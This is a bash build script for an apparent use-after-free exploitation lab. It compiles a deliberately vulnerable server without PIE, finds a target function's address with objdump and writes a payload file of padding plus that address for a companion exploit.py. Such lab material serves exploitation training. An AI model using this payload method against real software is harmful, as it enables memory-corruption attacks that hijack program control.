#!/bin/bash

echo "=== Linux Compilation Script for Use-After-Free Lab ==="
echo ""

# Check if we're on Linux
if [[ "$OSTYPE" != "linux-gnu"* ]]; then
    echo "[-] This script is for Linux systems only!"
    echo "[-] Current OS: $OSTYPE"
    exit 1
fi

echo "[+] Detected Linux system"
echo ""

# Create compiled directory if it doesn't exist
mkdir -p compiled

# Compile with Linux-specific flags for use-after-free
echo "[+] Compiling zafiyetli_sunucu.cpp for Linux (Use-After-Free)..."
g++ -o compiled/zafiyetli_sunucu source_codes/zafiyetli_sunucu.cpp -no-pie -g -static-libgcc -static-libstdc++

if [ $? -eq 0 ]; then
    echo "[+] Compilation successful!"
    echo "[+] Binary created: compiled/zafiyetli_sunucu"
    
    # Make it executable
    chmod +x compiled/zafiyetli_sunucu
    
    # Test the binary
    echo ""
    echo "[+] Testing the compiled binary..."
    echo "test" | ./compiled/zafiyetli_sunucu > /dev/null 2>&1
    if [ $? -eq 0 ] || [ $? -eq 139 ]; then  # 139 is SIGSEGV, expected for UAF
        echo "[+] Binary works correctly!"
    else
        echo "[-] Binary test failed"
    fi
    
    # Get target function address
    echo ""
    echo "[+] Finding target function address..."
    TARGET_ADDR=$(objdump -t compiled/zafiyetli_sunucu | grep "basariMesaji" | head -1 | cut -d' ' -f1)
    if [ ! -z "$TARGET_ADDR" ]; then
        echo "[+] Target function address: 0x$TARGET_ADDR"
        echo "[+] Update exploit.py with this address if needed"
    else
        echo "[-] Could not find target function address"
    fi
    
    # Create payload file
    echo ""
    echo "[+] Creating payload file..."
    python3 -c "
import struct
PADDING_SIZE = 104
TARGET_ADDRESS = 0x401166  # Default address, should be updated
payload = b'A' * PADDING_SIZE + struct.pack('<Q', TARGET_ADDRESS)
with open('compiled/payload.bin', 'wb') as f:
    f.write(payload)
print('Payload created: compiled/payload.bin')
" 2>/dev/null || echo "[-] Could not create payload file"
    
else
    echo "[-] Compilation failed!"
    echo ""
    echo "Common issues and solutions:"
    echo "1. Install g++: sudo apt-get install g++"
    echo "2. Install build-essential: sudo apt-get install build-essential"
    echo "3. For static linking issues, try: sudo apt-get install libc6-dev"
    exit 1
fi

echo ""
echo "=== Compilation Complete ==="
echo "You can now run: python3 source_codes/exploit.py"
echo "Note: You may need to update the target address in exploit.py"
